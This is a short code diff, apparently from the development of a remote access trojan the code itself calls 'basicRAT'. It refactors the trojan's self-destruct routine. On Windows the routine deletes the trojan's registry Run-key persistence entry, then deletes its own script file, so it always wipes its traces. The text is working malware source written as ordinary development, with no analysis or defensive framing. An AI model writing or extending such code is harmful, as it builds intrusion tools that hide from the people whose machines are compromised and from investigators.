@@ -12,24 +12,23 @@ import urllib
 import zipfile
 
 
-def selfdestruct(plat, persistence_applied):
-    if persistence_applied:
-        if plat == 'win':
-            import _winreg
-            from _winreg import HKEY_CURRENT_USER as HKCU
+def selfdestruct(plat):
+    if plat == 'win':
+        import _winreg
+        from _winreg import HKEY_CURRENT_USER as HKCU
 
-            try:
-                reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
-                _winreg.DeleteValue(reg_key, 'br')
-                _winreg.CloseKey(reg_key)
-            except WindowsError:
-                pass
-
-        elif plat == 'nix':
+        try:
+            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
+            _winreg.DeleteValue(reg_key, 'br')
+            _winreg.CloseKey(reg_key)
+        except WindowsError:
             pass
 
-        elif plat == 'mac':
-            pass
+    elif plat == 'nix':
+        pass
+
+    elif plat == 'mac':
+        pass
 
     # self delete basicRAT
     os.remove(sys.argv[0])
